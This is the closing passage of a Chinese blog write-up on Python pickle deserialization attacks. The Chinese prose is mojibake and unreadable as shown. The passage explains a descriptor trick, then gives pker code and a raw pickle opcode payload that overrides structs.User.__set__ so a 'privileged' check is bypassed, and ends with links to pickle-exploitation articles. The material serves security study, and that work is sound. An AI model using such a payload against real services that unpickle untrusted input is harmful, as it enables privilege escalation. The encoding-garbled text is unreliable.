&lt;p>æˆ‘ä»¬çŸ¥é“ï¼Œæœ‰&lt;code>__get__&lt;/code>ï¼Œ&lt;code>__set__&lt;/code>è¿™æ ·æè¿°å™¨åè®®æ–¹æ³•çš„å¯¹è±¡ç§°ä¸ºæè¿°å™¨descriptorã€‚é»˜è®¤å¯¹å±žæ€§çš„è®¿é—®æŽ§åˆ¶éƒ½æ˜¯ä»Žå¯¹è±¡çš„å­—å…¸__dict__é‡Œé¢è¿›è¡ŒèŽ·å–(get)ï¼Œè®¾ç½®(set)å’Œåˆ é™¤(delete)çš„æ–¹æ³•ï¼ˆå‰é¢çš„é‚£é“é¢˜ä¹Ÿç”¨åˆ°è¿™ä¸ªç‚¹ï¼‰ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œ&lt;code>a.x&lt;/code>çš„æŸ¥æ‰¾é¡ºåºæ˜¯&lt;code>a.__dict__['x']&lt;/code>ï¼Œä¹‹åŽ&lt;code>type(a).__dict__['x']&lt;/code>ï¼Œç„¶åŽæ‰¾type(a)çš„çˆ¶ç±»ã€‚å¦‚æžœæŸ¥æ‰¾åˆ°çš„å€¼æ˜¯ä¸€ä¸ªæè¿°å™¨ï¼Œpythonå°±ä¼šè°ƒç”¨æè¿°å™¨çš„æ–¹æ³•æ¥é‡å†™é»˜è®¤çš„æŽ§åˆ¶è¡Œä¸ºï¼Œè¿™ä¸ªé‡å†™å‘ç”Ÿåœ¨è¿™ä¸ªæŸ¥æ‰¾çŽ¯èŠ‚çš„å“ªé‡Œå–å†³äºŽå®šä¹‰äº†å“ªä¸ªæè¿°å™¨æ–¹æ³•ã€‚ï¼ˆæ³¨æ„ï¼šåªæœ‰åœ¨æ–°å¼ç±»ä¸­æ—¶æè¿°å™¨æ‰èµ·ä½œç”¨ï¼‰ï¼ˆæ›´å¤šä»‹ç»å‚è§ï¼š&lt;a href="https://foofish.net/what-is-descriptor-in-python.html">ä»€ä¹ˆæ˜¯æè¿°ç¬¦ï¼ˆdescriptorï¼‰&lt;/a>ï¼‰&lt;/p>
&lt;p>æˆ‘ä»¬åˆ©ç”¨æè¿°å™¨çš„ç‰¹æ€§ï¼Œå°†Userç±»çš„&lt;code>__set__&lt;/code>æ–¹æ³•é‡è½½ä¸ºstructs.Userï¼Œå¹¶æŠŠå®ƒçš„privilegedå±žæ€§èµ‹å€¼ä¸ºä¸€ä¸ªUserå®žä¾‹ã€‚å½“è¿›è¡Œself.user.privilegedè¢«èµ‹å€¼æ—¶è§¦å‘&lt;code>__set__&lt;/code>ï¼Œä½†ç”±äºŽå·²ç»è¢«é‡å†™ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šè¢«èµ‹å€¼Falseï¼Œè€Œæ˜¯ä¿æŒåŽŸæ ·ï¼Œè¿˜æ˜¯ä¸€ä¸ªUserå®žä¾‹ã€‚åœ¨åŽé¢ifåˆ¤æ–­æ—¶ï¼ŒUserå®žä¾‹å½“ç„¶æ˜¯Trueï¼Œå°±å¯ä»¥ç»•è¿‡äº†ã€‚&lt;/p>
&lt;p>pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">User&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;User&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__set__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;User&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">User&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">privileged&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">user&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">user&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>opcode&lt;/p>
&lt;pre tabindex="0">&lt;code>b&amp;quot;cstructs\nUser\np0\n0g0\n(}(S'__set__'\ncstructs\nUser\ndtbg0\n(I0\nI0\ntRp2\n0g0\n(}(S'privileged'\ng2\ndtbg2\n.&amp;quot;
&lt;/code>&lt;/pre>&lt;/details>
&lt;p>è€ƒè™‘åˆ°è¿™ä¸ªé¢˜æ›´ç»¼åˆäº†pythonçš„ç›¸å…³ç‰¹æ€§ï¼Œæ‰€ä»¥æŠŠè¿™ä¸ªé¢˜æ”¾åœ¨æœ€åŽã€‚&lt;/p>
&lt;hr>
&lt;p>ä»Žæ–°å»ºæ–‡ä»¶åˆ°å†™å®Œç”¨äº†å‡ å¤©æ—¶é—´ï¼Œç»†ç»†åœ°æ•´ç†ç›¸å…³çŸ¥è¯†ï¼Œä¹Ÿç®—æ˜¯å¯¹ååºåˆ—åŒ–è¿™ä¸ªçŸ¥è¯†ç‚¹çš„è®¤è¯†æ¸…æ™°äº†ä¸å°‘ã€‚è¿˜æœ‰ä¸€ä¸ªPyYAMLçš„ååºåˆ—åŒ–é—®é¢˜ï¼Œç”±äºŽç¯‡å¹…é—®é¢˜æ‹†å¼€æ¥æ”¾åˆ°ä¸‹ä¸€ç¯‡ä¸­ã€‚è‡ªè®¤ä¸ºæ€»ç»“çš„è¿˜æ˜¯æ¯”è¾ƒè¯¦ç»†çš„ï¼ˆå˜¿å˜¿xï¼‰ä¸è¿‡è‚¯å®šè¿˜æœ‰ä¸å‘¨åˆ°çš„åœ°æ–¹ï¼Œä¹‹åŽå¦‚é‡åˆ°æ›´å¤šçŸ¥è¯†è¿˜ä¼šè¿›è¡Œè¡¥å……ã€‚&lt;/p>
&lt;p>è‡ªå·±è¿˜æ˜¯æœ‰æƒ°æ€§å•Šï¼Œå…¶å®žååºåˆ—åŒ–ç¬¬ä¸€ç¯‡æ€»ç»“çš„æ˜¯phpï¼Œå¯æ˜¯åˆ°çŽ°åœ¨è¿˜æœ‰å‡ ä¸ªäºŒçº§æ ‡é¢˜ä¸‹é¢æ˜¯ç©ºç™½çš„â€¦â€¦åªèƒ½å…ˆç»™è‡ªå·±æ‰¾ä¸ªå€Ÿå£ï¼šphpååºåˆ—åŒ–çš„ä¸œè¥¿å®žåœ¨æ˜¯å¤ªå¤šäº†TAT&lt;/p>
&lt;hr>
&lt;p>æœ€åŽæ”¾ä¸€ä¸‹å…¨ç¯‡ç”¨åˆ°çš„çš„å‚è€ƒæ–‡ç« ï¼ˆéƒ¨åˆ†å·²å†™åœ¨å¯¹åº”æ ‡é¢˜ä¸‹é¢ï¼‰ï¼Œä¸åˆ†å…ˆåŽ~&lt;/p>
&lt;p>&lt;a href="https://www.cnblogs.com/wjrblogs/p/14057784.html">Python ååºåˆ—åŒ–æ¼æ´žå­¦ä¹ ç¬”è®°&lt;/a> | &lt;a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´žä¹‹ Python ååºåˆ—åŒ–æ¼æ´ž&lt;/a> | &lt;a href="https://xz.aliyun.com/t/7436#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2">pickleååºåˆ—åŒ–åˆæŽ¢&lt;/a> | &lt;a href="https://www.anquanke.com/post/id/188981#h2-10">Python pickle ååºåˆ—åŒ–å®žä¾‹åˆ†æž&lt;/a> | &lt;a href="https://segmentfault.com/a/1190000013099825">Python ååºåˆ—åŒ–å®‰å…¨é—®é¢˜ï¼ˆä¸€ï¼‰&lt;/a> - &lt;a href="https://segmentfault.com/a/1190000013214956">Python ååºåˆ—åŒ–å®‰å…¨é—®é¢˜ï¼ˆäºŒï¼‰&lt;/a> | &lt;a href="https://zhuanlan.zhihu.com/p/89132768">ä»Žé›¶å¼€å§‹pythonååºåˆ—åŒ–æ”»å‡»ï¼špickleåŽŸç†è§£æž &amp;amp; ä¸ç”¨reduceçš„RCEå§¿åŠ¿&lt;/a> | &lt;a href="https://blog.csdn.net/weixin_39929635/article/details/111003485">å…³äºŽPython secçš„ä¸€äº›ç®€å•çš„æ€»ç»“&lt;/a> | &lt;a href="https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2011/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">Sour Pickles A serialised exploitation guide in one part - Macro Slaviero&lt;/a> | &lt;a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX#">ðŸ Security Issues in Python Pickle&lt;/a>&lt;/p></description></item></channel></rss>